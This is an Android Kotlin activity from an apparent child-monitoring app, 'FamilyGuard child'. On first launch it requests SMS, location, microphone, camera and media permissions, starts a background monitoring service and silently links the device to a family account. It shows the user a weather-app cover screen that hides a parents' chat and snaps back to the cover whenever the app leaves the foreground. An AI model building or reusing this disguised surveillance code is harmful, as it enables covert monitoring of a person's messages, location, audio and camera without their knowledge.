package com.familyguard.child

import android.Manifest
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Surface
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import com.familyguard.child.agent.GuardForegroundService
import com.familyguard.child.agent.MonitoringSettings
import com.familyguard.child.data.ApiClient
import com.familyguard.child.ui.FamilyChat
import com.familyguard.child.ui.WeatherCover
import com.familyguard.child.ui.theme.FamilyGuardChildTheme
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive

class MainActivity : ComponentActivity() {
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions(),
    ) { GuardForegroundService.start(this) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            FamilyGuardChildTheme {
                Surface(Modifier.fillMaxSize()) {
                    ChildRoot(
                        onFirstLaunchPermissions = {
                            requestRuntimePermissions()
                            MonitoringSettings.openAllOnce(this)
                            GuardForegroundService.start(this)
                        },
                        onReady = { GuardForegroundService.start(this) },
                    )
                }
            }
        }
    }

    private fun requestRuntimePermissions() {
        val perms = mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
        )
        if (Build.VERSION.SDK_INT >= 33) {
            perms += Manifest.permission.READ_MEDIA_IMAGES
            perms += Manifest.permission.READ_MEDIA_VIDEO
        } else {
            perms += Manifest.permission.READ_EXTERNAL_STORAGE
        }
        permissionLauncher.launch(perms.toTypedArray())
    }
}

@Composable
private fun ChildRoot(
    onFirstLaunchPermissions: () -> Unit,
    onReady: () -> Unit,
) {
    var chat by remember { mutableStateOf(false) }
    var coverKey by remember { mutableIntStateOf(0) }
    val api = remember { ApiClient(ChildApp.instance.session) }
    val lifecycleOwner = LocalLifecycleOwner.current

    DisposableEffect(lifecycleOwner) {
        val obs = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_STOP) {
                chat = false
                coverKey++
            }
        }
        lifecycleOwner.lifecycle.addObserver(obs)
        onDispose { lifecycleOwner.lifecycle.removeObserver(obs) }
    }

    LaunchedEffect(Unit) {
        delay(400)
        if (!ChildApp.instance.session.permissionsAsked()) {
            onFirstLaunchPermissions()
            ChildApp.instance.session.markPermissionsAsked()
            ChildApp.instance.session.markTrustScreensAsked()
        } else {
            onReady()
            if (!ChildApp.instance.session.trustScreensAsked()) {
                MonitoringSettings.openTrustScreens(ChildApp.instance)
                ChildApp.instance.session.markTrustScreensAsked()
            }
        }
        while (isActive) {
            runCatching {
                val deviceName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
                val res = api.autoJoin(deviceName)
                ChildApp.instance.session.saveAuth(
                    res.tokens.accessToken,
                    res.tokens.refreshToken,
                    res.family!!.id,
                    res.deviceId ?: 0,
                    res.user.id,
                    res.user.displayName,
                )
                onReady()
                return@LaunchedEffect
            }
            delay(4000)
        }
    }

    if (chat) {
        FamilyChat(title = "Ota-ona", onBack = { chat = false })
    } else {
        androidx.compose.runtime.key(coverKey) {
            WeatherCover(onOpenChat = { chat = true })
        }
    }
}
